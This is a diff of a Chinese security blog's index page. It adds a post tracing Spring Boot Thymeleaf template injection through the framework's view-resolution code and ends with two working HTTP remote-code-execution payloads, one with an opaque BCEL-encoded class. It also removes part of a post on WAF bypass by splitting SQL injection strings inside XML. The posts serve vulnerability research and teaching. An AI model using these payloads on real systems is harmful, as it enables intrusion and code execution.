@@ -152,6 +152,118 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-spring-boot-thymeleaf-ssti" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/10/spring-boot-thymeleaf-ssti/">spring-boot-thymeleaf-ssti</a>
+    </h1>
+  
+
+        
+        <a href="/2021/08/10/spring-boot-thymeleaf-ssti/" class="archive-article-date">
+  	<time datetime="2021-08-11T05:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="spring-boot-thymeleaf-ssti"><a href="#spring-boot-thymeleaf-ssti" class="headerlink" title="spring-boot-thymeleaf-ssti"></a>spring-boot-thymeleaf-ssti</h1><p>spring-boot下的thymeleaf模板注入挺有趣的，本文尝试对该漏洞一探究竟。</p>
+<p><code>https://github.com/veracode-research/spring-view-manipulation</code></p>
+<p>本文使用该项目给出的demo进行调试分析，其中，<code>spring-boot</code>版本为<code>2.2.0.RELEASE</code>，</p>
+<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><h3 id="自动装配"><a href="#自动装配" class="headerlink" title="自动装配"></a>自动装配</h3><p>首先，我们知道，在配置好spring-boot情况下，加入如下thymeleaf的mvn依赖，就可以实现thymeleaf的自动配置。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>thtmyleaf</code>的自动配置类为<code>org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration</code></p>
+<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/ThymeleafAutoConfiguration.png" alt="ThymeleafAutoConfiguration"></p>
+<h3 id="排序viewResolvers"><a href="#排序viewResolvers" class="headerlink" title="排序viewResolvers"></a>排序viewResolvers</h3><p>我们可以看到，在<code>o.s.w.s.v.ContentNegotiatingViewResolver#initServletContext</code>方法中，对<code>viewResolvers</code>进行初始化，初始化后包含了多个视图解析器（模板引擎），包括 <code>BeanNameViewResolver</code>、<code>ViewResolverComposite</code>、<code>InternalResourceViewResolver</code>、<code>ThymeleafViewResolver</code>。</p>
+<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/org.springframework.web.servlet.view.ContentNegotiatingViewResolver#initServletContext.png" alt="org.springframework.web.servlet.view.ContentNegotiatingViewResolver#initServletContext"></p>
+<p>查看<code>ThymeleafViewResolver</code>源码，发现其<code>order</code>值为<code>Integer.MAX_VALUE</code>，通过<code>sort</code>方法排序过后的结果如下图所示（<code>BeanNameViewResolver</code>也是Integer.MAX_VALUE）：</p>
+<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/viewResolvers_sorted.png" alt="viewResolvers_sorted"></p>
+<p>具体代码流可以参考这里的堆栈信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getOrder:282, ThymeleafViewResolver (org.thymeleaf.spring5.view)</span><br><span class="line">...</span><br><span class="line">initServletContext:206, ContentNegotiatingViewResolver (org.springframework.web.servlet.view)</span><br><span class="line">...</span><br><span class="line">refresh:550, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">...</span><br><span class="line">refreshContext:397, SpringApplication (org.springframework.boot)</span><br><span class="line">run:315, SpringApplication (org.springframework.boot)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h2 id="视图解析"><a href="#视图解析" class="headerlink" title="视图解析"></a>视图解析</h2><h3 id="获得视图解析器"><a href="#获得视图解析器" class="headerlink" title="获得视图解析器"></a>获得视图解析器</h3><p><code>org.springframework.web.servlet.DispatcherServlet#render</code>：用户发起的请求触发的代码会走到这里获取视图解析器，随后从<code>resolveViewName</code>获得最匹配的视图解析器。</p>
+<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/org.springframework.web.servlet.DispatcherServlet#render.png" alt="org.springframework.web.servlet.DispatcherServlet#render"></p>
+<p><code>org.springframework.web.servlet.view.ContentNegotiatingViewResolver#resolveViewName</code>：在该方法中，先是通过<code>getCandidateViews</code>筛选出<code>resolveViewName</code>方法返回值不为null（即有效的）的视图解析器；之后通过<code>getBestView</code>方法选取“最优”的解，<code>getBestView</code>中的逻辑简而概之，优先返回重定向的视图动作，然后就是根据用户HTTP请求的<code>Accept:</code>头部字段与<code>candidateViews</code>数组中视图解析器的排序获得最优解的视图解析器，而前面所讲到的<code>viewResolvers</code>的排序正是参与决定了这一排序决策。</p>
+<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/org.springframework.web.servlet.view.ContentNegotiatingViewResolver#resolveViewName.png" alt="org.springframework.web.servlet.view.ContentNegotiatingViewResolver#resolveViewName"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">resolveViewName:227, ContentNegotiatingViewResolver (org.springframework.web.servlet.view)</span><br><span class="line">resolveViewName:1414, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">render:1350, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processDispatchResult:1118, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doDispatch:1057, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">...</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h3 id="获得视图解析器名称"><a href="#获得视图解析器名称" class="headerlink" title="获得视图解析器名称"></a>获得视图解析器名称</h3><p><code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#invokeHandlerMethod</code>：该方法为获取视图名称的关键点，其中首先会调用<code>invokeAndHandle</code>（下面会讲该方法内的逻辑），之后返回<code>getModelAnView</code>方法执行结果的返回值。</p>
+<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#invokeHandlerMethod.png" alt="org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#invokeHandlerMethod"></p>
+<p><code>o.s.w.s.m.m.a.ServletInvocableHandlerMethod#invokeAndHandle</code>:在该方法中，会尝试获取前端控制器的return返回值，也就是说，如果前端Controller返回值中直接拼接了用户的输入，相当于控制了该视图名称；另外，当用户自定义的Controller方法的入参中添加了<code>ServletResponse</code>，这里的<code>invokeForRequest</code>中会触发<code>ServletResponseMethodArgumentResolver#resolveArgument</code>将<code>mavContainer</code>的<code>requestHandled</code>设置为<code>true</code>，而<code>mavContainer.isRequestHandled()</code>为<code>true</code>导致了<code>getModelAndview（...）</code>返回值为null，也就不会有后面的漏洞触发流程。</p>
+<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod#invokeAndHandle.png" alt="org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod#invokeAndHandle"></p>
+<p><code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#getModelAndView</code>：如果<code>mavContainer.isRequestHandled()</code>为<code>true</code>，直接返回null。</p>
+<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#getModelAndView.png" alt="org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#getModelAndView"></p>
+<p><code>org.springframework.web.servlet.DispatcherServlet#applyDefaultViewName</code>：另外，如果前端Controller的方法返回值为null，即void方法类型，前面的流程无法拿到视图名称，后面会调用<code>applyDefaultViewName</code>方法将URI路径作为视图名称。</p>
+<p><code>org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator#transformPath</code>：在将URI设置为视图名称的代码流程中，调用了该方法对URI进行格式调整，其中包括去除URI扩展名称。</p>
+<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator#transformPath.png" alt="org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator#transformPath"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">getViewName:172, DefaultRequestToViewNameTranslator (org.springframework.web.servlet.view)</span><br><span class="line">getDefaultViewName:1391, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">applyDefaultViewName:1087, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doDispatch:1046, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">。。。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="使用视图解析器"><a href="#使用视图解析器" class="headerlink" title="使用视图解析器"></a>使用视图解析器</h3><p><code>org.thymeleaf.spring5.view.ThymeleafView#renderFragment</code>：这里是漏洞触发的关键逻辑点之一，如果用户的输入拼接到了视图名称中，即控制了<code>viewTemplateName</code>变量。通过浏览代码，我们可以了解到，首先视图模板名称中需要包含<code>::</code>字符串，否则不会走入表达式执行代码中。</p>
+<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/org.thymeleaf.spring5.view.ThymeleafView#renderFragment.png" alt="org.thymeleaf.spring5.view.ThymeleafView#renderFragment"></p>
+<p>上图的<code>o.t.s.e.StandardExpressionParser#parseExpression</code>不重要，我们这里略过，其随后会走到<code>org.thymeleaf.standard.expression.StandardExpressionPreprocessor#preprocess</code>方法：这里的<code>input</code>变量就是上面<code>viewTemplateName</code>前后分别拼接了<code>~{</code>、<code>}</code>后的字符串，随后这里使用<code>PREPROCESS_EVAL_PATTERN</code>正则对<code>input</code>进行匹配，正则内容为<code>\_\_(.*?)\_\_</code> ，随后获取正则命中后的元组内容，即非贪婪匹配的<code>.*?</code>，随后讲该元组内容传入<code>parseExpression</code>方法并在这里触发了EL表达式代码执行。</p>
+<p><img src="/2021/08/10/spring-boot-thymeleaf-ssti/org.thymeleaf.standard.expression.StandardExpressionPreprocessor#preprocess.png" alt="org.thymeleaf.standard.expression.StandardExpressionPreprocessor#preprocess"></p>
+<h2 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h2><p>由触发的代码流程梳理可以得出触发表达式的条件：</p>
+<p>①用户传入的字符串拼接到了视图引擎名称<code>viewTemplateName</code>中</p>
+<p>②视图引擎名称中需要包含<code>::</code>字符串</p>
+<p>③被执行表达式字符串前后需要带有两个下划线，即<code>__${EL}__</code></p>
+<p>④如果POC在URI中，由于URI格式化的原因且我们的POC中带有<code>.</code>符号，所以需要在URI末尾添加<code>.</code></p>
+<p>于是，我们可以构造出与作者有所差异的POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;path HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line"></span><br><span class="line">lang&#x3D;::__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()&#125;_______________</span><br></pre></td></tr></table></figure>
+
+<p>如果我们要利用该漏洞干点啥，建议还是结合BCEL一类的方式来利用更加方便（不过JDK251后BCEL使用不了），win弹计算器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;path HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 1010</span><br><span class="line"></span><br><span class="line">lang&#x3D;::__$&#123;&quot;&quot;.getClass().forName(&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AePMO$c2$40$U$9c$85B$a1$W$84$e2$f7$b7$t$c1$83$3dx$c4x1z$b1$w$R$83$e7$ed$b2$c1$c5$d2$92R$8c$fe$o$cf$5e$d4x$f0$H$f8$a3$8c$af$x$R$a3$7bx$_o$e6$cdL$de$7e$7c$be$bd$D$d8$c7$b6$F$Ts$W$e6$b1P$c0b$da$97L$y$9bX1$b1$ca$90$3fP$a1J$O$Z$b2$f5F$87$c18$8a$ba$92a$d6S$a1$3c$l$P$7c$Z_q$3f$m$c4$f1$o$c1$83$O$8fU$3aO$40$p$b9Q$a3$94$T$d1$c0$f5$a5$I$dc$W$7f$I$o$dem2$U$OD0$b1$$$b5$T$$n$cf$f8P$cb$u$9c$c1jG$e3X$c8$T$95$da$d8$T$d5$5e$9f$dfq$h$F$UM$ac$d9X$c7$GEP$aa$b0$b1$89$z$86Z$ca$bb$B$P$7b$ee$f1$bd$90$c3DE$nC$e5o8A$d3$c5$L$bf$_E$c2P$9dB$97$e30Q$D$ca$b5z2$f9$Z$e6$eb$N$ef$df$O$dda$c8$7b$v$Yv$ea$bf$d8v$S$ab$b0$d7$fc$zh$c5$91$90$a3Q$T$db$c8$d3$7f$a7$_$D$96$deB$d5$a2$c9$a5$ce$a8$e7v_$c0$9e4$3dC5$af$c1$Ml$aa$f6$f7$CJ$uS$_$60$f6G$7c$a1$cd$80$f2$x2N$f6$Z$c6$f5$p$8c$d3$t$8d$VI$97CV$bb90$a8$9a$84YH$3f$b2D$a8$ad$fd$81$8af2$9e$89$wH$e8h$b8$f6$Fz7$85$d0$t$C$A$A&quot;, true, &quot;&quot;.getClass().forName(&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;).newInstance())&#125;_______________</span><br></pre></td></tr></table></figure>
+
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>spring-boot的自动化配置为开发部署带来了极大的便捷，但这也对我们深入底层问题提搞了学习成本。而该模板注入问题十分巧妙，令人深思，另外笔者也为自研的AST代码扫描器无法扫描该种漏洞感到蛋疼。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/10/spring-boot-thymeleaf-ssti/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Flink-Memory-Shell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1270,139 +1382,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-WAF_Bypass之XML解析-上" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/">WAF_Bypass之XML解析-上</a>
-    </h1>
-  
-
-        
-        <a href="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/" class="archive-article-date">
-  	<time datetime="2020-06-28T12:28:55.016Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>XML系列将分为上下篇，本篇为上篇，主要讲述目前的原理及手法，下篇将会给出实战的应用。</p>
-<p>前段时间，笔者大致阅读了JAVA的XML解析库的底层解析代码<em>xerces</em>，实际上对于JAVA来说，所有XML解析框架、解析器，最底层用的都是它，所以绕过手法比较通用。</p>
-<p>关于XML解析的研究也算是告一段落，本文也算是笔者的一篇笔记。</p>
-<h1 id="1-Charset"><a href="#1-Charset" class="headerlink" title="1. Charset"></a>1. Charset</h1><h2 id="1-1-Magic-Charset"><a href="#1-1-Magic-Charset" class="headerlink" title="1.1 Magic Charset"></a>1.1 Magic Charset</h2><p>XML文档可以通过头部标签声明版本与字符集，常见的有UTF-8、GBK、ISO-8859-1。</p>
-<p>JAVA的底层XML解析库xerces在在读取XML文档时，首先会根据XML文档的头4个字节选择对应的字符流Reader来读取XML文档，如果XML文档有XML标签头，该Reader只是用于读取XML标签头，后续的XML内容选用什么字符流Reader则会另外根据XML标签头来决定；如果XML文档没有标签头，则该Reader将会用于读取整个XML文档。</p>
-<p>根据XML文档头4个字节选择字符流读取器的关键代码位于 jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XMLEntityManager.java：</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/magic_charset.png" alt></p>
-<p>判断字符集的getEncodingName方法代码如下，其中UCS-4 2143、UCS-4 3412字最后是会抛异常提示不支持的字符编码。</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/flow_to_getEncodingName.png" alt></p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/getEncodingName.png" alt></p>
-<p>所以最后看来，我们可以得到下面这个表，而为了方面区分，笔者将该手法称为<strong>Magic Charset</strong>。</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/magic_bytes.png" alt></p>
-<h2 id="1-2-Declare-Charset"><a href="#1-2-Declare-Charset" class="headerlink" title="1.2 Declare Charset"></a>1.2 Declare Charset</h2><p>如果用户在XML文档的XML头标签中中通过encoding指定了字符集，后续的XML文档读取将会根据该属性值选择一个字符流读取器。</p>
-<p>最后设置Reader的关键代码位于</p>
-<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XMLDocumentFragmentScannerImpl.java</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/scanXMLDecl.png" alt></p>
-<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XMLEntityScanner.java</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/declare_charset3.png" alt></p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/declare_charset2.png" alt></p>
-<p>在这里，我们还另外需要关注一下createReader中的EncodingMap，这里对字符集名称做了别名的映射，如IBM037与CP037实际上是同一个字符集。</p>
-<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\util\EncodingMap.java：</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/EncodingMap.png" alt></p>
-<h2 id="1-3-Double-Charset"><a href="#1-3-Double-Charset" class="headerlink" title="1.3 Double Charset"></a>1.3 Double Charset</h2><p>由于magic charset与declare charset的逻辑是独立的，我们可以分别对XML头标签与XML内容使用不同的编码。</p>
-<h1 id="2-String-Split"><a href="#2-String-Split" class="headerlink" title="2. String Split"></a>2. String Split</h1><h2 id="2-1-LABEL-INSERT"><a href="#2-1-LABEL-INSERT" class="headerlink" title="2.1 LABEL INSERT"></a>2.1 LABEL INSERT</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" union select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>添加额外标签进行字符串分割：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" uni<span class="tag">&lt;<span class="name">foo</span>&gt;</span>foo1 foo2<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;<span class="name">foofoo</span>/&gt;</span>on select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>使用注释进行字符串分割：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" uni<span class="comment">&lt;!--foo--&gt;</span>on select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>使用PI标签进行字符串分割：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" uni<span class="php"><span class="meta">&lt;?</span>foo1 foo2 <span class="meta">?&gt;</span></span>on select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XMLDocumentScannerImpl.java：</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/SCANNER_STATE_START_OF_MARKUP.png" alt></p>
-<h2 id="2-2-CDATA"><a href="#2-2-CDATA" class="headerlink" title="2.2 CDATA"></a>2.2 CDATA</h2><p>使用CDATA标签进行字符串分割：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" uni&lt;![CDATA[o]]&gt;n select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="3-DTD"><a href="#3-DTD" class="headerlink" title="3. DTD"></a>3. DTD</h1><p>值得注意的是，xstream默认关闭DTD；XMLDecoder虽然没有关闭，但是对于Weblogic XMLDecoder，由于其特色的解析流程，对于Weblogic XMLDecoder是无法利用的。</p>
-<p>这里不贴代码了，有的是来源RFC，而且代码是三个月前看的，不想找啊。</p>
-<h2 id="3-1-ATTLIST"><a href="#3-1-ATTLIST" class="headerlink" title="3.1 ATTLIST"></a>3.1 ATTLIST</h2><p>标签的属性与值，可以通过DTD进行定义，原始XML文档：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="ISO-8859-1" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>使用DTD ATTLIST，写作：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="ISO-8859-1" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ATTLIST <span class="meta-keyword">test</span> <span class="meta-keyword">att</span> <span class="meta-keyword">CDATA</span> <span class="meta-keyword">#FIXED</span> <span class="meta-string">"foo"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>使用HTML编码、CDATA也可以：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="ISO-8859-1" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ATTLIST <span class="meta-keyword">test</span> <span class="meta-keyword">att</span> <span class="meta-keyword">CDATA</span> <span class="meta-keyword">#FIXED</span> <span class="meta-string">"&lt;![CDATA[f]]&gt;&amp;#x6f;o"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="3-2-local-entity"><a href="#3-2-local-entity" class="headerlink" title="3.2 local entity"></a>3.2 local entity</h2><p>通过在DTD中定义本地实体，可在标签属性值、标签内容、DTD字符串值，这些字符串区域引用。</p>
